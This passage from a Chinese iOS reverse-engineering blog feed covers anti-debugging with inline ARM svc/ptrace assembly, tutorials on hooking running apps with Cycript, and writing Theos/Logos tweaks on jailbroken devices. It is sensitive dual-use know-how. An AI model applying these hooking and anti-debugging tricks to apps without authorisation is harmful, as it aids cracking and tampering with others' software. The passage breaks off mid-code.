class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs objective-c"> static __attribute__((always_inline)) void AntiDebugASM() &#123;<br><br>#ifdef __arm__<br><br>    asm volatile(<br><br>                 &quot;mov r0,#31\n&quot;<br><br>                 &quot;mov r1,#0\n&quot;<br><br>                 &quot;mov r2,#0\n&quot;<br><br>                 &quot;mov r12,#26\n&quot;<br><br>                 &quot;svc #80\n&quot;<br><br>                 );<br><br>#endif<br><br>#ifdef __arm64__<br><br>    asm volatile(<br><br>                 &quot;mov x0,#26\n&quot;<br><br>                 &quot;mov x1,#31\n&quot;<br><br>                 &quot;mov x2,#0\n&quot;<br><br>                 &quot;mov x3,#0\n&quot;<br><br>                 &quot;mov x16,#0\n&quot;<br><br>                 &quot;svc #128\n&quot;<br><br>                 );<br><br>#endif<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="内联汇编调用exit函数"><a href="#内联汇编调用exit函数" class="headerlink" title="内联汇编调用exit函数"></a>内联汇编调用exit函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs objective-c">static __attribute__((always_inline)) void OPENME() &#123;<br>    asm volatile(<br>                 &quot;mov x0,#0\n&quot;<br>                 &quot;mov x16,#1\n&quot;<br>                 &quot;svc #80\n&quot;<br>                 &quot;mov x1, #0\n&quot;<br>                 &quot;mov sp, x1\n&quot;<br>                 &quot;mov x29, x1\n&quot;<br>                 &quot;mov x30, x1\n&quot;<br>                 &quot;ret&quot;<br>    );<br>&#125;<br></code></pre></td></tr></table></figure><p>对于fishhook交换系统函数的绕过方式，我们可以通过将sysctl等函数调用放到动态库中，以保证检测函数可以在进攻注入的代码之前执行。动态库的加载顺序为Build Phases下的Link Binary With Libaraies中的排列顺序。</p><h2 id="svc-syscall-ptrace-反反调试"><a href="#svc-syscall-ptrace-反反调试" class="headerlink" title="svc + syscall + ptrace 反反调试"></a>svc + syscall + ptrace 反反调试</h2> <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/youshaoduo/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">83688732</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>iOS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>iOS</tag>
      
      <tag>反调试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iOS之cycript</title>
    <link href="/2021/08/22/iOS-cycript/"/>
    <url>/2021/08/22/iOS-cycript/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Cycript是由Cydia创始人Saurik推出的一款脚本语言，Cycript混合了OC、JavaScript语法的解释器，我们能够在一个命令中使用Oc或者JavaScript，甚至两者并用。它能够挂钩正在运行的进程，能够在运行时修改很多东西。</p><p><a href="http://www.cycript.org/manual/#97846f1e-fda4-43bc-8432-45bb1115c433">官方参考手册</a></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>1.越狱手机安装Cycript插件，ssh登录到手机中</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">cycript -<span class="hljs-selector-tag">p</span> pid<br></code></pre></td></tr></table></figure><p>2.使用MonkeyDev新建MonkeyApp工程，运行需要动态调试的App,Monkey默认开启了Cycript服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs objective-c">CHConstructor&#123;<br>    NSLog(INSERT_SUCCESS_WELCOME);<br>    <br>    [[NSNotificationCenter defaultCenter] addObserverForName:UIApplicationDidFinishLaunchingNotification object:nil queue:[NSOperationQueue mainQueue] usingBlock:^(NSNotification * _Nonnull note) &#123;<br>        <br>#ifndef __OPTIMIZE__<br>        CYListenServer(6666);<br><br>        MDCycriptManager* manager = [MDCycriptManager sharedInstance];<br>        [manager loadCycript:NO];<br><br>        NSError* error;<br>        NSString* result = [manager evaluateCycript:@&quot;UIApp&quot; error:&amp;error];<br>        NSLog(@&quot;result: %@&quot;, result);<br>        if(error.code != 0)&#123;<br>            NSLog(@&quot;error: %@&quot;, error.localizedDescription);<br>        &#125;<br>#endif<br>        <br>    &#125;];<br>&#125;<br></code></pre></td></tr></table></figure><p>我们只需要Cycript链接到目标应用：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cycript</span> -r IP:<span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ul><li>UIApp</li><li>NSHomeDirectory()</li><li>[[NSBundle mainBundle] bundleIdentifier]</li><li>UIApp.delegate</li><li>UIApp.keyWindow</li><li>UIApp.keyWindow.recursiveDescription().toString()</li><li>UIApp.keyWindow.rootViewController </li><li>#address :获取该对象</li><li>*#address:打印该对象成员变量</li><li>?exit</li></ul><h3 id="弹窗"><a href="#弹窗" class="headerlink" title="弹窗"></a>弹窗</h3><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs objectivec">alert = [[<span class="hljs-built_in">UIAlertView</span> alloc]initWithTitle:<span class="hljs-string">&quot;@@&quot;</span> message:<span class="hljs-string">&quot;hahaha&quot;</span> delegate:<span class="hljs-literal">nil</span> cancelButtonTitle:<span class="hljs-string">&quot;OK&quot;</span> otherButtonTitles:<span class="hljs-literal">nil</span>]<br></code></pre></td></tr></table></figure><p>调用</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart">[alert <span class="hljs-keyword">show</span>]<br>[#<span class="hljs-number">0x1046bcbc0</span> <span class="hljs-keyword">show</span>]<br>alert.<span class="hljs-keyword">show</span>()<br></code></pre></td></tr></table></figure><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><ol><li><p>将手机语言设置未英文（方便定位），进入设置-关于</p></li><li><p>打印当前页面的所有信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">UIApp.keyWindow.recursiveDescription().toString()<br><br><span class="hljs-comment">//只显示一部分</span><br> &lt;PSTableCell: <span class="hljs-number">0x10392e000</span>; baseClass = UITableViewCell; frame = (<span class="hljs-number">0</span> <span class="hljs-number">290</span>; <span class="hljs-number">375</span> <span class="hljs-number">44</span>); text = <span class="hljs-string">&#x27;Network&#x27;</span>; autoresize = W; tag = <span class="hljs-number">4</span>; layer = &lt;CALayer: <span class="hljs-number">0x2811e46a0</span>&gt;&gt;\n<br></code></pre></td></tr></table></figure><p>可以看见Network的PSTableCell以及对象地址</p></li><li><p>隐藏/显示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//隐藏</span><br>[#<span class="hljs-number">0x10392e000</span> setHidden:YES]<br><span class="hljs-comment">//显示</span><br>[#<span class="hljs-number">0x10392e000</span> setHidden:NO]<br></code></pre></td></tr></table></figure></li><li><p>通过nextResponder找到cell对应的controller</p><p>通过三次nextResponder最终找到了controller-&gt;PSGAboutController</p> <img src="/2021/08/22/iOS-cycript/images/%E4%BF%AE%E6%94%B9controller.png" class=""></li><li><p>修改controller的标题</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">[#<span class="hljs-number">0x104137400</span> setTitle:<span class="hljs-string">&quot;Cola&quot;</span>]<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>iOS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hook</tag>
      
      <tag>iOS</tag>
      
      <tag>cycript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iOS之Tweak</title>
    <link href="/2021/08/22/iOS-Tweak/"/>
    <url>/2021/08/22/iOS-Tweak/</url>
    
    <content type="html"><![CDATA[<h2 id="编写HOOK插件"><a href="#编写HOOK插件" class="headerlink" title="编写HOOK插件"></a>编写HOOK插件</h2><h3 id="创建工程"><a href="#创建工程" class="headerlink" title="创建工程"></a>创建工程</h3><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">1</span>. 终端输入<span class="hljs-selector-tag">nic</span><span class="hljs-selector-class">.pl</span><br><span class="hljs-selector-tag">2</span>. <span class="hljs-selector-tag">Choose</span> <span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">Template</span> (required): <span class="hljs-selector-tag">10</span><br><span class="hljs-selector-tag">3</span>. <span class="hljs-selector-tag">Project</span> <span class="hljs-selector-tag">Name</span> (required): 工程名<br><span class="hljs-selector-tag">4</span>. <span class="hljs-selector-tag">Package</span> <span class="hljs-selector-tag">Name</span> <span class="hljs-selector-attr">[com.yourcompany.tututest]</span>:  包名:<span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span><br><span class="hljs-selector-tag">5</span>. <span class="hljs-selector-tag">Author</span>/<span class="hljs-selector-tag">Maintainer</span> <span class="hljs-selector-tag">Name</span> <span class="hljs-selector-attr">[lk]</span>: 作者<br><span class="hljs-selector-tag">6</span>. <span class="hljs-selector-attr">[iphone/tweak]</span> <span class="hljs-selector-tag">MobileSubstrate</span> <span class="hljs-selector-tag">Bundle</span> <span class="hljs-selector-tag">filter</span> <span class="hljs-selector-attr">[com.apple.springboard]</span>: 要<span class="hljs-selector-tag">Hook</span>的包名<br><span class="hljs-selector-tag">7</span>. <span class="hljs-selector-attr">[iphone/tweak]</span> <span class="hljs-selector-tag">List</span> <span class="hljs-selector-tag">of</span> <span class="hljs-selector-tag">applications</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">terminate</span> <span class="hljs-selector-tag">upon</span> <span class="hljs-selector-tag">installation</span> (space-separated, <span class="hljs-string">&#x27;-&#x27;</span> for none) <span class="hljs-selector-attr">[SpringBoard]</span>: 回车默认<br><br></code></pre></td></tr></table></figure><h3 id="工程文件简介"><a href="#工程文件简介" class="headerlink" title="工程文件简介"></a>工程文件简介</h3><p>创建好的工程下共有4个文件</p> <img src="/2021/08/22/iOS-Tweak/images/tweakproject.png" class=""><ul><li><p>Makefile   编译文件</p></li><li><p>Tweak.x    编写HOOK文件</p></li><li><p>control     插件作者、版本信息</p></li><li><p>demo001.plist  设置要HOOK的Bundle ID</p></li></ul><h4 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h4><p>指定工程用到的文件,框架,库等信息,将整个过程自动化</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs makefile">INSTALL_TARGET_PROCESSES = SpringBoard<br><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$(THEOS)</span>/makefiles/common.mk<br><br>TWEAK_NAME = demo001<br><br>demo001_FILES = Tweak.x<br>demo001_CFLAGS = -fobjc-arc<br><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$(THEOS_MAKE_PATH)</span>/tweak.mk<br></code></pre></td></tr></table></figure><ol><li>INSTALL_TARGET_PROCESSES = SpringBoard 目标安装的项目</li><li>include $(THEOS)/makefiles/common.mk 固定写法 </li><li>TWEAK_NAME = demo001 tweak的名称</li><li>demo001_FILES = Tweak.x tweak源文件,多个文件以空格分隔</li><li>include $(THEOS_MAKE_PATH)/tweak.mk 通过include命令指定不同的.mk文件</li></ol><p>除了上面的信息格式,我们还可以添加以下信息</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs makefile">我们如何通过进行指定SDK?<br>TARGET = iPhone:latest:8.0 <br><br>我们如何导入framework?<br>demo001_FRAMWORKS = UIKit  <br><br>我们如何指定处理器架构<br>ARCHS = armv7 arm64  <br><br>我么如何链接Mach-O对象<br>demo001_LDFLAGS = -lx<br>注意<br>-lx 代表链接libx.a或libx.dylib,即给x加上lib的前缀,以及.a或.dylib的后缀,可以根据自己的项目进行调整<br><br></code></pre></td></tr></table></figure><h4 id="Tweak-x"><a href="#Tweak-x" class="headerlink" title="Tweak.x"></a>Tweak.x</h4><p>xm 中的x代表这个文件支持Logos语法</p><p>x 如果后缀名是单独的x,说明源文件支持Logos和C语法;</p><p>xm 如果后缀名是xm,说明源文件支持Logos和C/C++语法.</p><p>.xi 将首先作为objective-c进行预处理，然后Logos将处理结果，然后将进行编译。</p><p>.xmi 将首先作为objective-c ++进行预处理，然后Logos将处理结果，然后将进行编译。</p><h4 id="demo001-plist"><a href="#demo001-plist" class="headerlink" title="demo001.plist"></a>demo001.plist</h4><p>用于指定需要注入的目标文件的Bundle ID</p><h4 id="control"><a href="#control" class="headerlink" title="control"></a>control</h4><p>指定deb包的一些信息,包括名字,描述,版本号等</p><h3 id="编写HOOK代码"><a href="#编写HOOK代码" class="headerlink" title="编写HOOK代码"></a>编写HOOK代码</h3><p>编辑tweak.x</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-comment">//hook ViewController的test方法</span><br><span class="hljs-tag"></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">hook</span></span> ViewController<br><br>-<span class="ruby"> (void)test&#123;</span><br><span class="ruby"></span><br>    NSLog(@&quot;🍺🍺🍺HOOK🍺🍺🍺&quot;);<br>&#125;<br><span class="hljs-tag"></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">end</span></span><br></code></pre></td></tr></table></figure><p>设置环境变量</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> THEOS_DEVICE_IP = localhost<br><span class="hljs-builtin-name">export</span> THEOS_DEVICE_PORT = 2222<br></code></pre></td></tr></table></figure><h3 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h3><p>使用iproxy转发手机22端口到本地2222</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">iproxy</span> <span class="hljs-number">2222</span> <span class="hljs-number">22</span><br></code></pre></td></tr></table></figure><p>终端输入 make；make package install</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-built_in">make</span><br><span class="hljs-built_in">make</span> <span class="hljs-keyword">package</span> install<br></code></pre></td></tr></table></figure><h2 id="Logos语法"><a href="#Logos语法" class="headerlink" title="Logos语法"></a>Logos语法</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>phonedevwiki.net<span class="hljs-regexp">/index.php/</span>Logos<br></code></pre></td></tr></table></figure><table><thead><tr><th>Logos语法</th><th>功能解释</th><th>事例</th></tr></thead><tbody><tr><td>%hook</td><td>需要hook哪个类</td><td>%hook Classname</td></tr><tr><td>%end</td><td>代码块结束标记</td><td>%end</td></tr><tr><td>%group</td><td>分组</td><td>%group Groupname</td></tr><tr><td>%new</td><td>添加新方法</td><td>%new(signature)</td></tr><tr><td>%ctor</td><td>构造函数</td><td>%ctor { … }</td></tr><tr><td>%dtor</td><td>析构函数</td><td>%dtor { … }</td></tr><tr><td>%log</td><td>输出打印</td><td>%log; %log([(), …]);</td></tr><tr><td>%orig</td><td>保持原有方法</td><td>%orig；%orig(arg1, …)；</td></tr><tr><td>%c</td><td>动态获取类</td><td>%c([+/-]Class)；</td></tr></tbody></table><h3 id="1-hook-end"><a href="#1-hook-end" class="headerlink" title="1. %hook %end"></a>1. %hook %end</h3><p>指定需要hook的class,必须以％end结尾。</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-comment">// hook SpringBoard类里面的_menuButtonDown函数,先打印一句话,再之子那个函数原始的操作</span><br><span class="hljs-tag">%<span class="hljs-selector-tag">hook</span></span> SpringBorad<br>-<span class="ruby"> (void)<span class="hljs-symbol">_menuButtonDown:</span>(id)down</span><br><span class="ruby"></span>&#123;<br>    NSLog(@&quot;111111&quot;);<br><span class="hljs-tag">   %<span class="hljs-selector-tag">orig</span></span>; // 调用原始的_menuButtonDown函数<br>&#125;<br><span class="hljs-tag">%<span class="hljs-selector-tag">end</span></span><br></code></pre></td></tr></table></figure><h3 id="2-group"><a href="#2-group" class="headerlink" title="2.%group"></a>2.%group</h3><p>该指令用于将%hook分组，便于代码管理及按条件初始化分组，必须以%end结尾。 </p><p>一个％group可以包含多个%hook,所有不属于某个自定义group的％hook会被隐式归类到％group_ungrouped中。</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">group</span></span> iOS8<br><span class="hljs-tag">%<span class="hljs-selector-tag">hook</span></span> IOS8_SPECIFIC_CLASS<br><span class="hljs-comment">    // your code here</span><br><span class="hljs-tag">%<span class="hljs-selector-tag">end</span></span> // end hook<br><span class="hljs-tag">%<span class="hljs-selector-tag">end</span></span> // end group ios8<br><span class="hljs-tag"></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">group</span></span> iOS9<br><span class="hljs-tag">%<span class="hljs-selector-tag">hook</span></span> IOS9_SPECIFIC_CLASS<br><span class="hljs-comment">    // your code here</span><br><span class="hljs-tag">%<span class="hljs-selector-tag">end</span></span> // end hook<br><span class="hljs-tag">%<span class="hljs-selector-tag">end</span></span> // end group ios9<br><span class="hljs-tag"></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">ctor</span></span> &#123;<br>    if (kCFCoreFoundationVersionNumber &gt; 1200) &#123;<br><span class="hljs-tag">        %<span class="hljs-selector-tag">init</span>(iOS9)</span>;<br>    &#125; else &#123;<br><span class="hljs-tag">        %<span class="hljs-selector-tag">init</span>(iOS8)</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-new"><a href="#3-new" class="headerlink" title="3.%new"></a>3.%new</h3><p>在%hook内部使用，给一个现有class添加新函数，功能与class_addMethod相同. </p><p>注：<br>Objective-C的category与class_addMethod的区别： </p><p>前者是静态的而后者是动态的。使用%new添加,而不需要向.h文件中添加函数声明,如果使用category,可能与遇到这样那样的错误.</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">hook</span></span> SpringBoard<br><span class="hljs-tag">%<span class="hljs-selector-tag">new</span></span><br>-<span class="ruby"> (void)addNewMethod</span><br><span class="ruby"></span>&#123;<br>    NSLog(@&quot;动态添加一个方法到SpringBoard&quot;);<br>&#125;<br><span class="hljs-tag">%<span class="hljs-selector-tag">end</span></span><br></code></pre></td></tr></table></figure><h3 id="4-ctor"><a href="#4-ctor" class="headerlink" title="4.%ctor"></a>4.%ctor</h3><p>tweak的constructor,完成初始化工作；如果不显示定义，Theos会自动生成一个%ctor,并在其中调用%init(_ungrouped)。</p><p>%ctor一般可以用来初始化%group,以及进行MSHookFunction等操作,如下:</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta">#ifndef KCFCoreFoundationVersionNumber_iOS_8_0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KCFCoreFoundationVersionNumber_iOS_8_0      1140.10</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>%ctor<br>&#123;<br>    %<span class="hljs-keyword">init</span>;<br><br>    <span class="hljs-keyword">if</span> (KCFCoreFoundationVersionNumber &gt;= KCFCoreFoundationVersionNumber_iOS_7_0 &amp;&amp; KCFCoreFoundationVersionNumber &gt; KCFCoreFoundationVersionNumber_iOS_8_0)<br>    %<span class="hljs-keyword">init</span>(iOS7Hook);<br> <span class="hljs-keyword">if</span> (KCFCoreFoundationVersionNumber &gt;= KCFCoreFoundationVersionNumber_iOS_8_0)<br>    %<span class="hljs-keyword">init</span>(iOS8Hook);<br>MSHookFunction((<span class="hljs-keyword">void</span> *)&amp;AudioServicesPlaySystemSound,(<span class="hljs-keyword">void</span> *)&amp;replaced_AudioServerPlaySystemSound,(<span class="hljs-keyword">void</span> **)&amp;orginal_AudioServicesPlaySystemSound);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-dtor"><a href="#5-dtor" class="headerlink" title="5.%dtor"></a>5.%dtor</h3><p>Generate an anonymous deconstructor (of default priority).</p><h3 id="6-log"><a href="#6-log" class="headerlink" title="6.%log"></a>6.%log</h3><p>该指令在%hook内部使用，将函数的类名、参数等信息写入syslog,可以％log([(),…..])的格式追加其他打印信息。</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">hook</span></span> SpringBorad<br>-<span class="ruby"> (void)<span class="hljs-symbol">_menuButtonDown:</span>(id)down</span><br><span class="ruby"></span>&#123;<br><span class="hljs-tag">    %<span class="hljs-selector-tag">log</span>((NSString *)</span>@&quot;iosre&quot;,(NSString *)@&quot;Debug&quot;);<br><span class="hljs-tag">    %<span class="hljs-selector-tag">orig</span></span>; // 调用原始的_menuButtonDown方法<br>&#125;<br><span class="hljs-tag">%<span class="hljs-selector-tag">end</span></span><br></code></pre></td></tr></table></figure><h3 id="7-orig"><a href="#7-orig" class="headerlink" title="7.%orig"></a>7.%orig</h3><p>该指令在%hook内部使用，执行被hook的函数的原始代码；也可以用％orig更改原始函数的参数。</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">hook</span></span> SpringBorad<br>-<span class="ruby"> (void)<span class="hljs-symbol">setCustomSubtitleText:</span>(id)arg1 <span class="hljs-symbol">withColor:</span>   (id)arg2</span><br><span class="ruby"></span>&#123;<br><span class="hljs-tag">    %<span class="hljs-selector-tag">orig</span>(@&quot;change arg2&quot;,arg2)</span>;// 将arg2的参数修 改为&quot;change arg2&quot;<br>&#125;<br><span class="hljs-tag">%<span class="hljs-selector-tag">end</span></span><br></code></pre></td></tr></table></figure><h3 id="8-init"><a href="#8-init" class="headerlink" title="8.%init"></a>8.%init</h3><p>该指令用于初始化某个％group，必须在%hook或％ctor内调用；如果带参数，则初始化指定的group，如果不带参数，则初始化_ungrouped. </p><p>注： 切记，只有调用了％init,对应的%group才能起作用！</p><h3 id="9-c"><a href="#9-c" class="headerlink" title="9.%c"></a>9.%c</h3><p>该指令的作用等同于objc_getClass或NSClassFromString,即动态获取一个类的定义，在%hook或％ctor内使用 。</p><p>调用ViewController中的Method方法</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">[[[%c(ViewController) alloc ] init]<span class="hljs-function"><span class="hljs-keyword">Method</span>];</span> <br></code></pre></td></tr></table></figure><h2 id="日志打印"><a href="#日志打印" class="headerlink" title="日志打印"></a>日志打印</h2><p>hook demo方法并添加打印入参</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"> <br><span class="hljs-meta">#import <span class="hljs-meta-string">&quot;ViewController.h&quot;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">@interface</span> <span class="hljs-title">ViewController</span> ()</span><br> <span class="hljs-comment">//点击事件</span><br>- (<span class="hljs-keyword">IBAction</span>)compute;<br><br><span class="hljs-keyword">@end</span><br><br><span class="hljs-class"><span class="hljs-keyword">@implementation</span> <span class="hljs-title">ViewController</span></span><br><br>- (<span class="hljs-keyword">void</span>)viewDidLoad &#123;<br>    [<span class="hljs-keyword">super</span> viewDidLoad];<br>    <span class="hljs-comment">// Do any additional setup after loading the view.</span><br>    <br>&#125;<br> <br>- (<span class="hljs-keyword">IBAction</span>)compute &#123;<br>    <br>    [<span class="hljs-keyword">self</span> demo:<span class="hljs-string">@&quot;66&quot;</span>];<br>    <br>&#125;<br> <br>- (<span class="hljs-keyword">void</span>)demo:(<span class="hljs-built_in">NSString</span> *)str&#123;<br>   <span class="hljs-built_in">NSString</span> *res = [str stringByAppendingString:<span class="hljs-string">@&quot;🐂🐂🐂&quot;</span>];<br>    <span class="hljs-built_in">NSLog</span>(res);<br>  <br>    <br>&#125;<br><span class="hljs-keyword">@end</span><br><br></code></pre></td></tr></table></figure><p>logify.pl生成.xm文件</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//根据class-dump后的ViewController.h生成.x文件</span><br>logify.pl <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ViewController</span>.</span></span>h &gt;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Tweak</span>.</span></span>x<br></code></pre></td></tr></table></figure><p>我们之关系程序中自己写的方法</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-comment">//经过删减过后的Tweak.x文件</span><br><span class="hljs-tag"></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">hook</span></span> ViewController<br> <br>-<span class="ruby"> (void)<span 